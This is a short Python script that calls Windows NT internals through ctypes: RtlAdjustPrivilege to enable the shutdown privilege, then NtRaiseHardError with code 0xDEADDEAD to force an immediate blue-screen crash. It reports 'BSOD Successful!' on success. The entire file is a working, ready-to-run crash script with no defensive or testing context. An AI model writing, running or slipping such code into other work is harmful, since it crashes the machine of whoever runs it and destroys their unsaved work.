import ctypes

# 1. Gain 'Shutdown' privileges so we can trigger a system-level error
ntdll = ctypes.windll.ntdll
prev_value = ctypes.c_bool()
res = ctypes.c_ulong()
ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))

# 2. Raise a 'Hard Error' which Windows cannot handle, forcing a BSOD
# 0xDEADDEAD is a common 'manually initiated' crash code
if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
    print("BSOD Successful!")
else:
    print("BSOD Failed (likely lacks administrator permissions).")
